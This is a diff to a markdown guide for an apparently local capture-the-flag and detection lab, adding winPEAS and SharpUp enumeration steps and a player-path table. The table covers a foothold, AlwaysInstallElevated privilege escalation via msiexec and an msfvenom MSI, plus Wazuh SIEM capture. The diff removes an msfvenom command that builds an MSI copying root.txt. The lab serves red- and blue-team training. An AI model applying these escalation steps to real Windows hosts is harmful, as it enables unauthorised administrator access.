@@ -254,6 +254,79 @@ Both must return `0x1`.
 
 ---
 
+## Phase 6a — winPEAS enumeration (optional)
+
+For the textbook PEAS-style enumeration view, drive winPEAS from the
+attacker host:
+
+```bash
+./scripts/run-winpeas.sh 127.0.0.1
+```
+
+The wrapper downloads `winPEASx64.exe` from the upstream peass-ng release,
+stages it on a temporary local HTTP server, and runs it as `User_Joe` via a
+one-shot scheduled task (`PsExec -u` / `Start-Process -Credential` fail
+from a WinRM remote shell — see [winpeas.md](winpeas.md) for why). The
+captured report is teed to `artifacts/cysvuln/winpeas-joe-<timestamp>.log`.
+
+Headline findings (excerpt):
+
+```
+====== UAC Status (T1548.002)
+    ConsentPromptBehaviorAdmin: 0 - No prompting
+    EnableLUA: 1
+
+====== Checking AlwaysInstallElevated (T1548.002)
+    AlwaysInstallElevated set to 1 in HKLM!
+    AlwaysInstallElevated set to 1 in HKCU!
+
+====== Current Token privileges (T1134.001)
+    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeIncreaseWorkingSetPrivilege: DISABLED
+```
+
+Full curated writeup: [winpeas.md](winpeas.md).
+
+---
+
+## Phase 6b — SharpUp enumeration (optional)
+
+For GhostPack's focused C# privesc auditor (much shorter output, same
+AIE headline):
+
+```bash
+./scripts/fetch-cysvuln-artifacts.sh   # warns if SharpUp.exe absent
+./scripts/run-sharpup.sh 127.0.0.1
+```
+
+Uses the same `joe_task_runner` harness as Phase 6a. SharpUp has no
+upstream prebuilt releases, so the binary is **vendored** at
+`infrastructure/artifacts/cysvuln/SharpUp.exe` (build instructions in
+[sharpup.md](sharpup.md)).
+
+Headline excerpt:
+
+```
+=== Always Install Elevated ===
+	HKCU: 1
+	HKLM: 1
+
+=== Registry AutoLogons ===
+	DefaultUserName: Administrator
+
+=== Unattended Install Files ===
+	C:\Windows\Panther\Unattend.xml
+
+=== Services with Unquoted Paths ===
+	Service 'fswsService' (StartMode: Automatic) has executable
+	'C:\EFS Software\Easy File Sharing Web Server\fswsService.exe',
+	but 'C:\EFS' is modifable.
+```
+
+Full curated writeup: [sharpup.md](sharpup.md).
+
+---
+
 ## Phase 7 — Privilege escalation (MSI)
 
 Generate a probe MSI on the attacker host (replaces msfvenom for validation):
@@ -327,7 +400,15 @@ cysvuln-root-flag-placeholder
 | Foothold | `check_efs69_response.py --mode callback --service-port 80` | `whoami` → `user_joe` |
 | User flag | `type user.txt` | `flag{cysvuln-user-local-test}` |
 | AIE audit | `audit_aie.py --profile-user User_Joe` | `chain response expected: True` |
+| winPEAS (optional) | `./scripts/run-winpeas.sh 127.0.0.1` | `AlwaysInstallElevated set to 1 in HKLM!` / `... in HKCU!` |
+| SharpUp (optional) | `./scripts/run-sharpup.sh 127.0.0.1` | `=== Always Install Elevated ===  HKCU: 1  HKLM: 1` |
 | Privesc | `msiexec /quiet /i aie-probe.msi` | CustomActionSchedule in log |
+| msfvenom MSI (optional) | `nix develop .#kali; ./scripts/run-msfvenom-aie.sh 127.0.0.1` | `aie-msfvenom-flag.txt == root.txt` |
+| SIEM capture (blue team) | `./scripts/observability-loop.sh` | `summary.csv` + `msiexec-timeline.json` per iter (see [blue-team-report.md](blue-team-report.md)) |
+| Baseline observability tour | `./scripts/observability/run-baseline-tour.sh` | Per-phase `matrix.md` + winPEAS/SharpUp/privesc SIEM slices (see [baseline-observability.md](baseline-observability.md)) |
+| **10x stress campaign (red + blue)** | `./scripts/observability/stress-campaign.sh --iterations 10` | `campaign-summary.csv` + per-iter `red-scorecard.json` / `blue-scorecard.json` (see [stress-campaign-report.md](stress-campaign-report.md), [ctf-issues-log.md](ctf-issues-log.md)) |
+| EFS app log (Phase 4) | Wazuh archives filter `EFS Software` / rule `60602` on `fswsService.exe` crash | After `Savelog=1` + agent.conf tail; see baseline Phase 04 redo |
+| Dataset export / Proxmox replay | `./scripts/wazuh-export-dataset.sh --run-id <id> --tarball` then `./scripts/wazuh-replay-to-proxmox.sh` | `dataset/MANIFEST.md`, `dataset.tar.zst` (see [runbooks/wazuh-dataset-export-and-replay.md](../runbooks/wazuh-dataset-export-and-replay.md)) |
 | Root flag | `type root.txt` | `flag{cysvuln-root-local-test}` |
 
 **Automated chain** (same player path, no scheduled tasks):
@@ -356,25 +437,15 @@ nix develop .#kali
 ./scripts/check-cysvuln-tooling.sh --kali
 ```
 
-### msfvenom (optional)
+### msfvenom
 
-```bash
-msfvenom -p windows/exec \
-  CMD='cmd /c copy C:\Users\Administrator\Desktop\root.txt C:\Users\Public\pwned.txt' \
-  -f msi -o privesc.msi EXITFUNC=thread
-```
+Superseded by the [msfvenom.md](msfvenom.md) writeup —
+`nix develop .#kali; ./scripts/run-msfvenom-aie.sh 127.0.0.1` is the
+end-to-end automated path (msfvenom build -> HTTP stage -> interactive
+User_Joe -> flag cross-check).
 
-### SharpUp (manual fetch)
+### SharpUp
 
-SharpUp has no nixpkgs package. Download from [GhostPack/SharpUp](https://github.com/GhostPack/SharpUp) and transfer to the victim.
-
-```powershell
-C:\Users\Public\SharpUp.exe audit AlwaysInstallElevated
-```
-
-Expected:
-
-```
-AlwaysInstallElevated is enabled!
-HKLM: 1  HKCU: 1
-```
+Superseded by [Phase 6b](#phase-6b--sharpup-enumeration-optional) and
+[sharpup.md](sharpup.md) — `./scripts/run-sharpup.sh 127.0.0.1` is the
+automated path.
